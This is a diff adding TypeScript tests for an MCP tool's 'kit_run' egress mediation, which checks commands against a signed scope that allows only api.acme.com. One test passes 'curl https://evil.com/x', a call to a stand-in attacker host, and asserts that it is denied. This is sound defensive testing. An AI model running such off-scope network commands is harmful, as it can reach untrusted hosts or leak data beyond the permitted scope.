@@ -446,6 +446,65 @@ describe("kit_secrets + signed-scope runtime enforcement (MCP-runtime adoption s
   });
 });
 
+// ─── kit_run per-command egress mediation (MCP-runtime adoption step 4) ──────────────────
+describe("kit_run + signed-scope egress mediation", () => {
+  let tempDir: string;
+  let idDir: string;
+  let savedId: string | undefined;
+
+  const SCOPED = `version = 1\n[scope]\negress = ["api.acme.com"]\nenforce_runtime = true\n`;
+
+  beforeEach(async () => {
+    tempDir = await mkdtemp(join(tmpdir(), "kit-mcp-run-"));
+    idDir = await mkdtemp(join(tmpdir(), "kit-mcp-id-"));
+    savedId = process.env.KIT_IDENTITY_DIR;
+    process.env.KIT_IDENTITY_DIR = idDir;
+    loadOrCreateIdentity();
+    await writeFile(join(tempDir, ".kit.toml"), FIXTURE_EMPTY, "utf-8");
+    await writeFile(join(tempDir, PROFILE_FILE), SCOPED);
+    await signProfile(tempDir);
+  });
+
+  afterEach(async () => {
+    if (savedId === undefined) delete process.env.KIT_IDENTITY_DIR;
+    else process.env.KIT_IDENTITY_DIR = savedId;
+    await rm(tempDir, { recursive: true, force: true });
+    await rm(idDir, { recursive: true, force: true });
+  });
+
+  it("DENIES a command whose explicit URL is outside the signed [scope].egress", async () => {
+    const { client, cleanup } = await createTestClient();
+    try {
+      const result = await client.callTool({
+        name: "kit_run",
+        arguments: { command: "curl https://evil.com/x", cwd: tempDir },
+      });
+      assert.equal(
+        result.isError,
+        true,
+        "off-scope egress in the command must be denied pre-spawn",
+      );
+    } finally {
+      await cleanup();
+    }
+  });
+
+  it("ALLOWS a command with no explicit URL (documented conservative limit)", async () => {
+    const { client, cleanup } = await createTestClient();
+    try {
+      const result = await client.callTool({
+        name: "kit_run",
+        arguments: { command: "echo hello", cwd: tempDir },
+      });
+      assert.notEqual(result.isError, true);
+      const text = (result.content as Array<{ text: string }>)[0].text;
+      assert.match(text, /hello/);
+    } finally {
+      await cleanup();
+    }
+  });
+});
+
 // ─── kit_install ───────────────────────────────────────────────────────────
 
 describe("kit_install", () => {
